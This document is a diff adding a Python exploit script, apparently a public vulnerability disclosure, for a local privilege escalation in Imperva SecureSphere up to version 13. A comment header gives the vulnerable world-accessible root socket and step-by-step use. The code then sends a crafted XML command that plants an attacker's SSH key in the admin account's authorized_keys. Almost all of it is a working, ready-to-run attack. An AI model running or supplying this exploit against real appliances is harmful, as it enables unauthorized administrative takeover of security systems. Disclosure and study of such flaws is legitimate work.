@@ -1,0 +1,56 @@
+# Title: Imperva SecureSphere <= v13 - Privilege Escalation
+# Author: 0x09AL
+# Date: 01/08/2018
+# Tested on: Imperva SecureSphere 11.5,12.0,13.0
+# Vendor: https://www.imperva.com/
+# Vulnerability Description
+# There is a program named PCE.py which runs as root and starts a unix domain socket listener in /tmp/PCEListener.
+# The problem is that the permissions in this socket are misconfigured. Every user on the system can interact with it.
+# Using this exploit you can add arbritary ssh keys to authorized_keys for the admin user and login as the admin.
+# Steps to reproduce:
+# 1. Be a low-privileged user like oracle,apache. (You can simulate it by using `su oracle`)
+# 2. Create a keypair. ssh-keygen -t rsa -b 4096
+# 3. Modify the ssh_key variable.
+# 4. Run python exploit.py
+# 5. Login as the admin user using ssh -i id_rsa admin@ip-address.
+# 
+
+
+import socket
+import sys
+import time
+# Create a UDS socket
+sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+
+# Connect the socket to the port where the server is listening
+server_address = '/tmp/PCEListener'
+data = ''
+
+# The ssh rsa-key to be added to the admin user.
+ssh_key = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDVM24qDoENqa1oRHJZEgZS7M/eRXHEnr0/OhdgUPWUblJJAj+f5fF7VkgvnJNSz/25OElNck4Z1qqpENBtHhe27H9100z2RceebKzNMOxHD2Sdut00uNMgL97AAuzhq6471XmcutHsndT12Bd85yxQPJiGaLIyEqgVigMaAz5Jya1pw4pB7r3m4hRbeFOaS74Edzr2pk8ND1EG/CG4qTP+dt0VhyjyEimZtt+2h4VT2spRNGzLO32vjPk4hSSSeu1dqPjg6dCNwgz6JS3clAaugeT8gnWjMnrt63PIUiXcioqEbJz+IHN20MHl2GXNuzAAvSw7U7ko4BhumfgchyFmkmfS6HdtP25kiQ6A4RexcAkfbfSYsapepHlvai1+FN+M67TpIpUlIR0xNrvJEgF6/51vAGCnOjZz4BDN740JHfGxAThyny5r4FTo5c9ZNYF8jAb6TqSX4HRS/AFo8l7AynPntCnXQCYSHcH/2XG/osrDNnuh0pUlTqCK10O2GoskBsxIBYTmWEoj/6hsbQyDGuicVa/e/xweo7MA2pNAPwxYDZt/h4G/wMrCSAk6FoEL6YXMRK/RwW6p2FDYRLeCoDa/RQ8R7dEquTLTqPgQF8rPsSuhILp/CKv03JkNRq94pDyCFGHHyz+TifZ0m1yIt13N7f8BXqw7OYFJ8cFGww== pwn@wpad'
+
+print >>sys.stderr, 'Connecting to %s' % server_address
+try:
+    sock.connect(server_address)
+except socket.error, msg:
+    print >>sys.stderr, msg
+    sys.exit(1)
+try:
+    # Send data
+    message = '<commandSet Id="0" mode="Sync" sender="localhost"><commands><command num="0"><argv>platform ssh authorized create</argv><impctlParams/><params><param>--user=admin</param><param>--key=%s</param></params></command></commands></commandSet>' % ssh_key
+    message_size = "0" * (10 - len(str(len(message)))) + str(len(message))
+    print >>sys.stderr, 'Sending message size "%s"' % message_size
+    sock.sendall("%s" % message_size)
+    print >> sys.stderr, 'Sending exploit'
+    sock.sendall(message)
+    amount_received = 0
+    amount_expected = int(sock.recv(10))
+    while amount_received < amount_expected:
+        data += sock.recv(10)
+        amount_received = len(data)
+        time.sleep(0.5)
+    #    print >>sys.stderr, 'received "%s"' % data
+    print >>sys.stderr, 'Response : \n %s' % data
+finally:
+    print >>sys.stderr, 'closing socket'
+    sock.close()
